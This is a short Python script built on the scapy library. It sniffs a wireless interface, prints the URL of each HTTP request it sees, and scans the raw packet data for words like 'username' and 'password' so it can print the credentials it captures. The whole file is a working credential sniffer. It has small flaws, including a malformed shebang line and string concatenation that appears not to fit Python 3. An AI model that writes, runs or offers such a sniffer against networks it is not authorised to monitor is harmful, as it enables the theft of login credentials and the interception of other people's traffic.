#!/usr/bin /env python3
import scapy.all as scapy
from scapy.layers import http

def xniffer(net_iface):
    scapy.sniff(iface=net_iface, store=False, prn=process_xniffed_pk)

def get_URL(pckt):

    return pckt[http.HTTPRequest].Host + pckt[http.HTTPRequest].Path

def get_login_info(pckt):
    if pckt.haslayer(scapy.Raw):
            load_li = pckt[scapy.Raw].load
            k_words = ["username","login", "user", "password", "pass"]
            for k_word in k_words:
                if k_word in load_li:
                    return load_li
    

def process_xniffed_pk(pckt):
    if pckt.haslayer(http.HTTPRequest):
        url = get_URL(pckt)
        print("URL >: ", url)
        login_info = get_login_info(pckt)

        if login_info:
            print("\n\nCredentials :>> " + login_info + "\n\n")          

xniffer("wlp2s0")